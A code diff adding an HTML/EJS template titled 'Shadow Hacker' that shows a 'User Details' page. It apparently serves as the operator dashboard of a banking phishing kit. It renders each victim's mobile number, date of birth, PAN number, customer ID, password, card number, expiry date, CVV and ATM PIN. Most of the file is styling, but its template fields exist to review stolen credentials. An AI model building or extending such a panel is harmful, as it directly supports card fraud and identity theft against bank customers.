@@ -1,0 +1,163 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>User Details</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600&display=swap" rel="stylesheet">
+  <style>
+    /* Reset & Global Styles */
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Inter', sans-serif;
+    }
+    body {
+      background: linear-gradient(135deg, #2C3E50, #4CA1AF);
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      padding: 20px;
+    }
+    /* Header */
+    .header {
+      text-align: center;
+      margin-bottom: 30px;
+      color: #fff;
+      font-size: 2.5rem;
+      font-weight: 600;
+      text-transform: uppercase;
+      letter-spacing: 2px;
+      text-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
+    }
+    /* Glassmorphism Container */
+    .container {
+      background: rgba(255, 255, 255, 0.15);
+      border: 1px solid rgba(255, 255, 255, 0.3);
+      border-radius: 16px;
+      backdrop-filter: blur(10px);
+      -webkit-backdrop-filter: blur(10px);
+      box-shadow: 0 8px 32px 0 rgba(31, 38, 135, 0.37);
+      padding: 40px;
+      width: 100%;
+      max-width: 500px;
+      text-align: center;
+      color: #e0e0e0;
+      transition: transform 0.3s ease, box-shadow 0.3s ease;
+    }
+    .container:hover {
+      transform: translateY(-5px);
+      box-shadow: 0 12px 40px rgba(31, 38, 135, 0.5);
+    }
+    h2 {
+      font-size: 2rem;
+      color: #00ffcc;
+      margin-bottom: 20px;
+      text-shadow: 0 2px 6px rgba(0, 0, 0, 0.3);
+    }
+    /* Info Sections */
+    .info-section {
+      background: rgba(0, 0, 0, 0.2);
+      padding: 15px;
+      border-radius: 10px;
+      margin: 20px 0;
+      text-align: left;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
+      transition: transform 0.2s ease;
+    }
+    .info-section:hover {
+      transform: translateY(-3px);
+    }
+    .info-section h3 {
+      font-size: 1.4rem;
+      margin-bottom: 10px;
+      color: #00d4ff;
+    }
+    .info-section p {
+      font-size: 1rem;
+      margin: 5px 0;
+      color: #cfcfcf;
+    }
+    /* Button Styling */
+    button {
+      background: #00ffcc;
+      color: #000;
+      padding: 15px;
+      border: none;
+      width: 100%;
+      font-size: 1.2rem;
+      cursor: pointer;
+      border-radius: 8px;
+      margin-top: 20px;
+      font-weight: bold;
+      transition: transform 0.2s ease, box-shadow 0.2s ease;
+    }
+    button:hover {
+      background: #00d4aa;
+      transform: translateY(-3px);
+      box-shadow: 0 6px 16px rgba(0, 0, 0, 0.2);
+    }
+    a {
+      text-decoration: none;
+    }
+    /* Footer */
+    .footer {
+      font-size: 0.9rem;
+      text-align: center;
+      margin-top: 30px;
+      color: #bbb;
+    }
+  </style>
+</head>
+<body>
+  <!-- Header -->
+  <div class="header">Shadow Hacker</div>
+  
+  <!-- Glassmorphism Container -->
+  <div class="container">
+    <h2>User Details</h2>
+    
+    <% if (user) { %>
+      <div class="info-section">
+        <h3>Personal Information</h3>
+        <p><strong>MOBILE-NO:</strong> <%= user.mobile %></p>
+        <p><strong>DOB:</strong> <%= user.dob %></p>
+        <p><strong>PAN NO:</strong> <%= user.pan %></p>
+      </div>
+    <% } %>
+    
+    <% if (cardPayment) { %>
+      <div class="info-section">
+        <h3>Card Payment Details</h3>
+        <p><strong>CUSTOMER-ID:</strong> <%= cardPayment.customerId %></p>
+        <p><strong>PASSWORD:</strong> <%= cardPayment.password %></p>
+      </div>
+    <% } %>
+    
+    <% if (netBanking) { %>
+      <div class="info-section">
+        <h3>Net Banking Details</h3>
+        <p><strong>CARD-NO:</strong> <%= netBanking.cardNumber %></p>
+        <p><strong>EXP:</strong> <%= netBanking.expiryDate %></p>
+        <p><strong>CVV:</strong> <%= netBanking.cvv %></p>
+        <p><strong>ATM-PIN:</strong> <%= netBanking.pin %></p>
+      </div>
+    <% } %>
+    
+    <% if (!user && !cardPayment && !netBanking) { %>
+      <p>No details found for this user.</p>
+    <% } %>
+    
+    <a href="/dashboard">
+      <button>Go to Dashboard</button>
+    </a>
+    
+    <div class="footer">
+      &copy; 2025 Shadow Hacker™ | "Breaking Boundaries, Securing Futures"
+    </div>
+  </div>
+</body>
+</html>
